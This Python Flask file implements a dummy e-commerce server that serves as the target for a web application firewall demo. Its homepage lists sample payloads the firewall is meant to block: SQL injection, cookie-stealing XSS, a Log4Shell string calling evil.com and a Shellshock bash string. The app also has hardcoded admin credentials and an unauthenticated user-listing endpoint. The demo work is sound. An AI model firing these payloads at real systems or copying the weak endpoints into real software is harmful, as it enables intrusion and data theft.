"""Dummy e-commerce API server — simulates a real company backend for WAF demo."""
from flask import Flask, request, jsonify, make_response
from datetime import datetime

app = Flask(__name__)

USERS = [
    {"id": 1, "name": "Alice Johnson", "email": "alice@shopexample.com", "role": "admin"},
    {"id": 2, "name": "Bob Smith",     "email": "bob@shopexample.com",   "role": "user"},
    {"id": 3, "name": "Carol White",   "email": "carol@shopexample.com", "role": "user"},
]
PRODUCTS = [
    {"id": 1, "name": "Laptop Pro 15",       "price": 1299.99, "stock": 42},
    {"id": 2, "name": "Wireless Headphones", "price": 199.99,  "stock": 156},
    {"id": 3, "name": "Mechanical Keyboard", "price": 149.99,  "stock": 88},
    {"id": 4, "name": "USB-C Hub",           "price": 49.99,   "stock": 220},
]

HOMEPAGE = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>ShopExample Corp.</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0d1117;color:#e6edf3;min-height:100vh}
    header{background:#161b22;border-bottom:1px solid #30363d;padding:16px 40px;display:flex;justify-content:space-between;align-items:center}
    header h1{font-size:20px;color:#58a6ff;font-weight:700}
    .tag{font-size:12px;color:#8b949e;background:#21262d;border:1px solid #30363d;padding:4px 12px;border-radius:20px}
    .hero{text-align:center;padding:60px 20px;border-bottom:1px solid #30363d}
    .hero h2{font-size:28px;margin-bottom:8px}
    .hero p{color:#8b949e;margin-bottom:20px}
    .warn{display:inline-block;padding:5px 14px;background:rgba(248,81,73,.15);color:#f85149;border:1px solid rgba(248,81,73,.3);border-radius:20px;font-size:12px;font-weight:600}
    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;padding:40px;max-width:1100px;margin:0 auto}
    .card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:24px}
    .card h3{font-size:12px;text-transform:uppercase;letter-spacing:1px;color:#8b949e;margin-bottom:14px}
    .ep{font-family:monospace;font-size:13px;color:#58a6ff;background:#0d1117;padding:8px 12px;border-radius:6px;margin:5px 0;border:1px solid #21262d;display:flex;align-items:center;gap:8px}
    .m{font-size:10px;font-weight:700;padding:2px 6px;border-radius:4px}
    .get{background:rgba(56,139,253,.15);color:#58a6ff}
    .post{background:rgba(63,185,80,.15);color:#3fb950}
    input{width:100%;padding:9px 12px;background:#0d1117;border:1px solid #30363d;border-radius:7px;color:#e6edf3;font-size:13px;margin-bottom:9px;outline:none}
    input:focus{border-color:#58a6ff}
    button{width:100%;padding:9px;background:#21262d;border:1px solid #30363d;border-radius:7px;color:#e6edf3;cursor:pointer;font-size:13px}
    button:hover{background:#30363d}
    code{font-family:monospace;font-size:12px;color:#ffa657}
    .payload{font-family:monospace;font-size:12px;color:#ff7b72;background:#0d1117;padding:8px 12px;border-radius:6px;margin:5px 0;border:1px solid #21262d}
    footer{text-align:center;padding:24px;color:#484f58;font-size:12px;border-top:1px solid #21262d;margin-top:20px}
  </style>
</head>
<body>
  <header>
    <h1>ShopExample Corp.</h1>
    <span class="tag">🛡 Protected by AISS WAF</span>
  </header>
  <div class="hero">
    <h2>Company E-Commerce Platform</h2>
    <p>A dummy server simulating a real company API — protected by the AISS WAF.</p>
    <span class="warn">⚠ Attack Simulation Target — Demo Only</span>
  </div>

  <div class="grid">
    <div class="card">
      <h3>Available Endpoints</h3>
      <div class="ep"><span class="m get">GET</span>/</div>
      <div class="ep"><span class="m post">POST</span>/login</div>
      <div class="ep"><span class="m get">GET</span>/search?q=laptop</div>
      <div class="ep"><span class="m get">GET</span>/api/users</div>
      <div class="ep"><span class="m get">GET</span>/api/products</div>
      <div class="ep"><span class="m post">POST</span>/comment</div>
    </div>

    <div class="card">
      <h3>Test Login (SQL Injection Target)</h3>
      <form action="/login" method="POST">
        <input name="username" placeholder="Username" value="admin"/>
        <input name="password" placeholder="Password" value="password"/>
        <button type="submit">Login →</button>
      </form>
      <p style="margin-top:12px;font-size:12px;color:#8b949e">Try username: <code>' OR 1=1--</code></p>
    </div>

    <div class="card">
      <h3>Search (XSS Target)</h3>
      <form action="/search" method="GET">
        <input name="q" placeholder="Search products..."/>
        <button type="submit">Search →</button>
      </form>
      <p style="margin-top:12px;font-size:12px;color:#8b949e">Try: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
    </div>

    <div class="card">
      <h3>Attack Payloads to Try (will be BLOCKED)</h3>
      <div class="payload">' OR 1=1--</div>
      <div class="payload">UNION SELECT * FROM users</div>
      <div class="payload">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div>
      <div class="payload">${jndi:ldap://evil.com/exploit}</div>
      <div class="payload">() { :;}; /bin/bash -i</div>
    </div>
  </div>
  <footer>ShopExample Corp. · AISS WAF Demo · Nginx + AISS Agent + WAF Proxy</footer>
</body>
</html>"""


@app.route("/")
def home():
    return HOMEPAGE


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "GET":
        return HOMEPAGE
    if request.is_json:
        data = request.get_json() or {}
        username = data.get("username", "")
        password = data.get("password", "")
    else:
        username = request.form.get("username", "")
        password = request.form.get("password", "")

    if username == "admin" and password == "password":
        return jsonify({"status": "success", "user": "admin", "token": "eyJfake_jwt_token_XYZ"})
    return jsonify({"status": "error", "message": "Invalid credentials"}), 401


@app.route("/search")
def search():
    q = request.args.get("q", "")
    if q:
        results = [p for p in PRODUCTS if q.lower() in p["name"].lower()]
    else:
        results = PRODUCTS
    return jsonify({"query": q, "results": results, "count": len(results)})


@app.route("/api/users")
def users():
    return jsonify({"users": USERS, "total": len(USERS)})


@app.route("/api/products")
def products():
    return jsonify({"products": PRODUCTS, "total": len(PRODUCTS)})


@app.route("/comment", methods=["POST"])
def comment():
    if request.is_json:
        text = (request.get_json() or {}).get("text", "")
    else:
        text = request.form.get("text", "")
    return jsonify({
        "status": "posted",
        "comment": text,
        "id": 42,
        "timestamp": datetime.utcnow().isoformat() + "Z",
    })


@app.route("/health")
def health():
    return jsonify({"status": "ok", "service": "dummy-server", "version": "1.0.0"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
